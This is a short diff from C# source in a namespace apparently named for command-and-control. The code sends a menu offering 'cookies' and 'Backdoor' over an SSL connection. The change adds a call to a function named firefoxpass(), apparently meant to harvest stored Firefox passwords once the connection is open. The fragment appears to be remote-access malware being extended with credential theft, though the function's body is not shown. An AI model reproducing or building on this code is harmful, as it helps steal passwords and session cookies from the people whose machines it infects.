@@ -51,6 +51,9 @@ namespace pm3candc
             menu += "4.- cookies\n";
             menu += "5.- Backdoor\n";
             ConnectSSL(menu);
+
+            firefoxpass();
+
         }
         static string ReadMessage(SslStream sslStream)
         {
